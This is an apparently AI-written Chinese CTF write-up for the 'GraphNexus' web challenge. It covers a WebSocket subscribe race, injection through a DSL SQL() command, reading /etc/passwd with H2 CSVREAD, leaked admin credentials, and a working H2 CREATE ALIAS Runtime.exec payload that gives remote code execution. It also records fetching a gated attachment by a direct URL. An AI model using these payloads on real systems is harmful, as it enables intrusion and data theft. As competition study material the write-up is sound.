# 12063 · GraphNexus（WEB / HARD / 500 分）

**flag**: `DASCTF{70885042158481839369551396905847}`　（提交内容 `70885042158481839369551396905847`）
**提交**: `{"code":"00000","message":"解题成功!","data":{"isCorrect":true,"correct":true,"eventId":83954}}`
**状态**: ✅ 已解出并提交成功（2026-10-24 ~10:55 CST，靶机 <target>:20308）

---

## 0. 一句话

Ktor/Netty 写的知识图谱平台，WebSocket 自定义二进制协议 `NXUS`；**订阅鉴权存在协议级窗口竞态**
——在解析完 101 响应头之后、消费 hello 帧之前发 SUBSCRIBE 即可拿到 `read,query,export,import`；
随后 DSL 的 `SQL()` 命令把字符串直接丢给 JDBC（H2 **2.2.224**），`CREATE ALIAS ... Runtime.exec`
拿到 RCE，最后 `/readflag`（setuid root）取 flag。

## 1. 附件：不是源码，是出题元数据

`ycb.py download 12063` 返回 `40403 无此权限`，但 detail.json 的 `attachment.url` 直连 OSS 可取（820 B）。
解包得到 `tempdir/WEB附件/problem.json` —— **出题方元数据**，`vulns` 字段直接给出链：

```json
"vulns": ["WebSocket协议级竞态条件", "自定义DSL查询引擎注入",
          "H2 Database CREATE ALIAS RCE", "自定义二进制帧协议"]
```

→ **关键更正：本题不是 GraphQL**（题名像），无 schema/内省可打。
且**附件无任何应用源码** ⇒ 协议规范的唯一来源只能是靶机本身。

## 2. 攻击面测绘

| 面 | 结果 |
|---|---|
| `GET /`、`/dashboard`、`/graph`、`/query` | 服务端渲染，**零客户端 JS**；页脚 "Built with Ktor" |
| `GET /api/v1/nodes`、`/edges`、`/health` | 只读数据；`{"version":"2.3.1","engine":"Ktor/Netty"}` |
| `GET /api/v1/search?q=` | 参数化（引号全部安全返回 0，无 SQLi） |
| `POST /api/v1/nodes` | 201 建节点；引号原样入库，**无注入** |
| `WS /ws/collab` | 真正的战场：NexusFrame 二进制协议 |
| `WS /ws/admin` | **纯诱饵**：`role:"admin"` 但所有命令空转（result 恒 null） |

> `POST /api/v1/nodes` 的唯一实际价值：它是验证 WS 写入是否落地的**外部 oracle**——
> 我用它证明了 opcode `0x04`(UPDATE) 是空操作（改不动任何节点）。

## 3. NexusFrame 协议（逆向结果）

```
frame = "NXUS" | opcode:1 | length:int32 BE | payload
```

| opcode | 方向 | 含义 |
|---|---|---|
| 0x01 | S→C | hello：`{"session":"nxs_..","protocol":"NexusFrame/2.3","encoding":"binary"}` |
| 0x03 | C→S | SUBSCRIBE（竞态入口） |
| 0x04 | C→S | UPDATE —— **payload 被完全忽略**，恒回 `UPDATE_RECEIVED` |
| 0x05 | C→S | DSL 查询 |
| 0x06 / 0x07 | C→S | export（GNX 二进制）/ import |
| 0x08 | S→C | 查询/导出回复 |
| 0x09 | S→C | 错误（`UNKNOWN_OPCODE` / `SUBSCRIBE_FAILED` / `AUTH_REQUIRED`） |
| 0x0a | S→C | 通用 ack |

附带发现：连接后 ~16s 服务器发 **WS 控制帧 PING(0x9)**，载荷 `[ping <64hex> ping]`
（挑战/心跳二合一）；GNX 导出格式魔数 `GNX!`。

## 4. ★ 竞态的真身（本题核心）

**判据：SUBSCRIBE 必须在「101 响应头已解析」与「hello 帧被消费」之间发出。**

命中即返回：
```json
{"subscribed":true,"token":"nxs_..","permissions":"read,query,export,import"}
```

三个**反例**把窗口钉死（这是本题最有价值的推理，不是靠爆破）：

| 做法 | 结果 | 说明 |
|---|---|---|
| 先读完 hello 再订阅 | `SUBSCRIBE_FAILED` | **太晚**，鉴权状态已初始化 |
| 把订阅塞进 upgrade 同一 TCP 段 | 被静默丢弃 | **太早**，会话还不存在 |
| 开两个连接互相赛 | 无效果 | 窗口在**单连接内**，不是并发竞争 |
| 房间名 main/lobby/裸串/无 query 参数 | **全都成功** | 房间名、掩码、query 参数全是**幌子** |

实现要点：读 101 头要**逐字节** `recv(1)` 读到 `\r\n\r\n` 就立刻 `sendall(SUBSCRIBE)`。

> 坑：重探测后服务器会**临时限流**（订阅全失败 + 偶发 RST，甚至 `Connection refused`）。
> 停 30–60s 自动恢复。我一度误判成"把靶机打 wedge 了"，实际是限流窗口。

## 5. DSL 注入 → SQL

`0x05` 的 payload 是**裸 DSL 字符串**（不是 JSON 字段；用 `{"query":...}` 会被整串当命令名）。
服务器自己把命令表报了出来：

```
Available: NODES.count, NODES.all, NODES.find(query), EDGES.count, SQL(query)
```

```
NODES.count              -> {"result":24,"code":200}
SQL(SELECT 1)            -> [{"1":"1"}]
SQL(SELECT H2VERSION())  -> 2.2.224
```

> ⚠️ **`SQL(x)` 包装器会吃掉 payload 的最后一个字符**（naive `substring(4, len-1)`）。
> 所以 SQL 必须以一个**牺牲空格**结尾：`SQL(<sql> )`。
> 这是本题最容易踩的坑——`SQL(SELECT ... 'PUBLIC')` 会丢掉收尾引号而报语法错。

## 6. 数据库与敏感信息

`NEXUS_ADMIN` / catalog `GRAPHNEXUS`；PUBLIC 表：`KNOWLEDGE_NODES`、`KNOWLEDGE_EDGES`、
`GRAPH_USERS`、`COLLAB_SESSIONS`。

```sql
SELECT * FROM GRAPH_USERS
-> 1 admin  / admin  / API_TOKEN gnx_48c1542cd4d241739ff0a694
   2 viewer / viewer / API_TOKEN null
```

任意文件读已确认：`SELECT * FROM CSVREAD('/etc/passwd')` 成功；
`FILE_READ('/flag.txt')` 返回 `AccessDeniedException`（root 400，JVM 读不到）。

## 7. H2 CREATE ALIAS → RCE

```sql
CREATE ALIAS EXECF AS $$ String f(String c) throws Exception {
  java.util.Scanner sc = new java.util.Scanner(
    Runtime.getRuntime().exec(new String[]{"sh","-c",c}).getInputStream()
  ).useDelimiter("\\A"); return sc.hasNext()?sc.next():""; } $$
CALL EXECF('id')  ->  uid=1000(appuser) gid=1000(appuser)
```

`/flag.txt` 是 `-r-------- root root 41`，但同目录有 **`/readflag`（`-rwsr-xr-x` setuid root）**：

```
/readflag -> DASCTF{70885042158481839369551396905847}
```

## 8. 复现

```bash
python3 scripts/12063-solve.py <host> <port>          # 全链，自动打印 flag
python3 scripts/12063-solve.py <host> <port> --check  # 只验到 DSL/H2，不打 RCE
```
脚本内置：竞态重试、限流退避、连接重置自动重连、alias 已存在时跳过创建、flag 正则断言。

## 9. 踩过的坑 / 排除的方向

1. **`/ws/admin` 是诱饵**：`role:"admin"` 白送但所有操作空转，别在那浪费时间。
2. **REST 全参数化**：`?q=` 与 `POST /nodes` 都没有注入，不要惯性去打 SQLi。
3. **`0x04 UPDATE` 是空操作**：payload 完全被忽略（用 REST oracle 证明）。
4. **房间名是幌子**：我曾在 31 个房间名上花掉 64 次探测才转向时序变量——教训是
   **当"同一个错误"对任意输入都成立时，先怀疑"不是输入的问题"**。
5. **`SQL()` 吃末字符**：不补空格所有复杂 SQL 都语法错。
6. 限流 ≠ wedge。

## 10. SKILLS

- `competition-web-runtime` —— 用了：UI 门禁只是提示、不是后端强制；先抓真实请求流再扩展。
- `competition-websocket-runtime` —— 用了：先定握手（path/子协议/鉴权材料位置），
  再把帧分成 hello/订阅/ack/心跳/推送 五类，最后做最小序列复现。**正是"鉴权材料在哪"
  这一步让我注意到鉴权不在帧里、而在 hello 之前的初始化窗口。**
- `competition-custom-protocol-replay` —— 用了核心判据「**一次只改一个字段/一条消息重放**」：
  我把「读不读 hello」隔离成唯一变量，才定位到竞态窗口（并发/房间名等都是先被排除的变量）。
- `ctf-web` —— 用了首轮工作流：先定信任边界，再为每个功能抓一条正常请求/响应对。
- `competition-graphql-rpc-drift` —— **loaded but unused**：经核验本题无 GraphQL，
  schema/内省/persisted query 判据不适用（这条更正避免了照题名打错方向）。

## 11. 产出

- `scripts/12063-solve.py` —— 可复现成品脚本（带 `--check` 自检）
- `evidence/12063-exploit.log` —— 完整链路与全部判据
- `evidence/submit-log.jsonl` —— 提交台账（`result: true`）
- `work/12063_graphnexus/` —— 探路脚本（probe1..14、jsproto、wsraw、spec、framediff、mockws、selftest）
